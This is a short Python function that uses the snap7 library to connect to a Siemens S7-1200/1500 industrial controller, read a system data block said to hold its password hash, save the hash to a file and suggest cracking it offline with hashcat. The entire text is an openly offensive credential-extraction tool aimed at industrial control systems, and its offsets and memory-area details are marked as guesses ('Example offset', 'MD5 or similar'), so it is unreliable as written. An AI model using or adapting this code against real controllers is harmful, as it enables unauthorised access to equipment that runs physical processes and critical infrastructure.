def extract_s7_password(plc_ip):
    """
    Extract password hash from S7-1200/1500 PLC
    Password stored in PLC memory
    """
    import snap7

    plc = snap7.client.Client()
    plc.connect(plc_ip, 0, 1)

    # Read system data block (SDB) containing password
    # SDB 2: Password and protection level

    try:
        sdb_data = plc.read_area(
            area=0x05,  # System Data Block
            db_number=2,
            start=0,
            size=100
        )

        # Parse password hash (MD5 or similar)
        password_hash = sdb_data[10:26]  # Example offset

        print(f"[+] Password hash extracted: {password_hash.hex()}")
        print("[*] Crack offline with hashcat")

        # Save to file for cracking
        with open("s7_password_hash.txt", "w") as f:
            f.write(password_hash.hex())

    except Exception as e:
        print(f"[-] Extraction failed: {e}")

    plc.disconnect()
